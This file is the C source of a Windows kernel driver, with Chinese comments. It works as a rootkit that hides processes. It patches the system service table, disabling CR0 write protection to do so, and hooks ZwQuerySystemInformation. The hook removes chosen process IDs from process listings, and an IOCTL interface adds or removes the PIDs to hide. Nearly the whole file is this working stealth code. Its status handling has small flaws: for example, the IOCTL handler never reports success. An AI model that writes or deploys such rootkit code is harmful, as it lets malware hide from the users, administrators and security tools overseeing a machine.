#include <ntddk.h>
#include "stdarg.h"
#include "stdio.h"
#include "ntiologc.h"
#include "HideProc.h"
#include "ioctl.h"

extern PServiceDescriptorTableEntry KeServiceDescriptorTable;

WCHAR * g_wch=L"Hello";

LONG g_HidePids[50];

#define SYSCALL(_function) KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)_function+1)]


NTSTATUS
DriverEntry(
	IN	PDRIVER_OBJECT		pDrvObj,
	IN	PUNICODE_STRING		pRegistryPath
)
{
	int i = 0;
	NTSTATUS status =  STATUS_SUCCESS;
	UNICODE_STRING ustrDevName;//设备名称
	UNICODE_STRING ustrLinkName;//符号连接名称
	
	PDEVICE_OBJECT pDevObj = NULL;

	DbgPrint("DriverEntry Loading...\n");

	RtlInitUnicodeString(&ustrDevName,DEVICE_NAME);

	RtlInitUnicodeString(&ustrLinkName,LINK_NAME);

	//test only
//	g_HidePids[0] = 8;
//	g_HidePids[1] = 136;
//	g_HidePids[2] = 420;
	for(i=0;i<50;i++)
		g_HidePids[i] = -1;
	
	
		//初始化各个例程
	pDrvObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
	pDrvObj->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
	pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
	pDrvObj->DriverUnload = DriverUnload;

	//创建设备
	status = IoCreateDevice(
		pDrvObj,
		0,
		&ustrDevName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&pDevObj);

	//创建设备失败
	if (!NT_SUCCESS(status))
	{	return status;	}

	status = IoCreateSymbolicLink(&ustrLinkName,&ustrDevName);
	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(pDevObj);
		return status;
	}

//	GetProcNameOffset();
//	AllHookOn();
	HookOn();

	return STATUS_SUCCESS;
}


NTSTATUS
DispatchCreateClose(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
	pIrp->IoStatus.Status  = STATUS_SUCCESS;
	IoCompleteRequest(pIrp,IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


//////////////////////////////////////////////////////////////////////////
//驱动卸载例程
VOID 
DriverUnload(
	IN PDRIVER_OBJECT		pDrvObj
)
{
	PDEVICE_OBJECT DevObjTmp1=NULL;
	PDEVICE_OBJECT DevObjTmp2=NULL;
	UNICODE_STRING ustrLinkName;
	int i = 0;

	DbgPrint("Driver Unloading");

//	AllHookOff();
	HookOff();

	RtlInitUnicodeString(&ustrLinkName,LINK_NAME);
	//删除符号连接
	IoDeleteSymbolicLink(&ustrLinkName);
	
	//删除设备对象
	if (pDrvObj)
	{
		DevObjTmp1=pDrvObj->DeviceObject;
		
		//删除设备
		while (DevObjTmp1)
		{
			DevObjTmp2=DevObjTmp1;
			DevObjTmp1=DevObjTmp1->NextDevice;
			IoDeleteDevice(DevObjTmp2);
			i++;

			DbgPrint("UnLoad %d",i);
		}
	}

}

void HookOn()
{
		OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(KeServiceDescriptorTable->ServiceTableBase[ *(PULONG)((PUCHAR)ZwQuerySystemInformation+1)]);
	
	_asm
    {
        CLI                   
			MOV    EAX, CR0        
			AND EAX, NOT 10000H 
			MOV    CR0, EAX        
    }
	
	(KeServiceDescriptorTable->ServiceTableBase[ *(PULONG)((PUCHAR)ZwQuerySystemInformation+1)]) = (ULONG)HookZwQuerySystemInformation;
	
    _asm 
    {
        MOV    EAX, CR0        
			OR    EAX, 10000H             
			MOV    CR0, EAX               
			STI                   
    }
}

void HookOff()
{
		_asm
    {
        CLI                   
			MOV    EAX, CR0        
			AND EAX, NOT 10000H 
			MOV    CR0, EAX        
    }
	(KeServiceDescriptorTable->ServiceTableBase[ *(PULONG)((PUCHAR)ZwQuerySystemInformation+1)]) = (ULONG)OldZwQuerySystemInformation;

	_asm 
    {
        MOV    EAX, CR0        
			OR    EAX, 10000H             
			MOV    CR0, EAX               
			STI                   
    }
}

BOOLEAN isHidePid(ULONG uPid)
{
	int i = 0 ;
	
	for (i=0;i<50;i++)
	{
		if(uPid==g_HidePids[i])
			return TRUE;
	}
	return FALSE;
}

NTSTATUS
HookZwQuerySystemInformation(
							  IN SYSTEM_INFORMATION_CLASS sysInfoClass,
							  IN OUT PVOID sysInfo,
							  IN ULONG sysInfoLen,
							  OUT PULONG RetLen OPTIONAL)
{	
	NTSTATUS status;
	PSYSTEM_PROCESSES pcur;
	PSYSTEM_PROCESSES prev;
	WCHAR * wch;
	ULONG uPID = 0;
	UNICODE_STRING ustrSysname;
	PUNICODE_STRING pustrFake;
	int bMod = FALSE;		

    status =  OldZwQuerySystemInformation(sysInfoClass,sysInfo,sysInfoLen,RetLen);
	if (NT_SUCCESS(status))
	{
		if (sysInfoClass==SystemProcessesAndThreadsInformation)
		{
			pcur = sysInfo;
			
			while(pcur)
            {    
				
				bMod = FALSE;
				if(isHidePid(pcur->ProcessId))    //修改成你要隐藏的程序
				{
					if(prev)
					{
						if(pcur->NextEntryDelta)
						{
							// make prev skip this entry
							prev->NextEntryDelta += pcur->NextEntryDelta;
							bMod = TRUE; //flag to say that we have modified 
						}
						else
						{
							// we are last, so make prev the end
							prev->NextEntryDelta = 0;
						}
					}
					else
					{
						if(pcur->NextEntryDelta)
						{
							// we are first in the list, so move it forward
							(char *)sysInfo += pcur->NextEntryDelta;
						}
						else
						{
							// we are the only process!
							sysInfo = NULL;
						}
					}
				}
				
            //  prev = pcur;
                if(!bMod)
                    prev = pcur;
                if(pcur->NextEntryDelta) 
				{((char *)pcur += pcur->NextEntryDelta);}
                else pcur = NULL;
            }

		}
			
			
		
	}
	else
	{
		return status;
	}

	return status;

}

NTSTATUS
DispatchIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	int i;
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	ULONG uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	PVOID pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
	ULONG uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
	ULONG uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;

	switch(uIoControlCode)
	{		
	case IOCTL_HIDEPID:
		{
			for(i=0;i<50;i++)
			{
				if(g_HidePids[i]==-1)
				{
					g_HidePids[i] = *(PLONG)pIoBuffer;
					break;
				}
			}
		}break;
	case IOCTL_SHOWPID:
		{
			
			for(i=0;i<50;i++)
			{
				if(g_HidePids[i]==*(PLONG)pIoBuffer)
				{
					g_HidePids[i] = -1;
					break;
				}
			}
			
		}break;

	}

	if(status == STATUS_SUCCESS)
		pIrp->IoStatus.Information = uOutSize;
	else
		pIrp->IoStatus.Information = 0;

	pIrp->IoStatus.Status = status;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return status;
}
